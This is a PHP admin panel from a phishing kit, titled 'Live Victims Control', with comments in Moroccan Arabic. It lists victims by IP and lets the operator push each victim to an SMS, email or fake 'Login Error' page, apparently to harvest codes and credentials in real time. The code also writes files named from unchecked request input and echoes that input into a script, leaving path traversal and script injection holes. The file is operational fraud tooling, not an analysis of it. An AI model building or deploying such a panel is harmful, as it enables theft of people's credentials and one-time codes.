<?php
// Had l-code ghir bach t-beddel l-status
if (isset($_GET['action']) && isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $go = $_GET['action'];
    file_put_contents("status_" . $ip . ".txt", $go);
    echo "<script>alert('Victim $ip sent to $go'); window.location='panel.php';</script>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Control</title>
    <style>
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 10px; border: 1px solid #ddd; text-align: center; }
        .btn { padding: 5px 10px; text-decoration: none; color: white; border-radius: 3px; }
        .sms { background: #007bff; } .mail { background: #28a745; } .err { background: #dc3545; }
    </style>
</head>
<body>
    <h2>Live Victims Control</h2>
    <table>
        <tr>
            <th>Victim IP</th>
            <th>Current Status</th>
            <th>Actions</th>
        </tr>
        <?php
        // Kan-l9aw ga3 l-files dial status
        foreach (glob("status_*.txt") as $filename) {
            $ip = str_replace(["status_", ".txt"], "", $filename);
            $status = file_get_contents($filename);
            echo "<tr>
                <td>$ip</td>
                <td><b>$status</b></td>
                <td>
                    <a class='btn sms' href='?ip=$ip&action=sms.php'>Send SMS</a>
                    <a class='btn mail' href='?ip=$ip&action=email.php'>Send Email</a>
                    <a class='btn err' href='?ip=$ip&action=login.php'>Login Error</a>
                </td>
            </tr>";
        }
        ?>
    </table>
</body>
</html>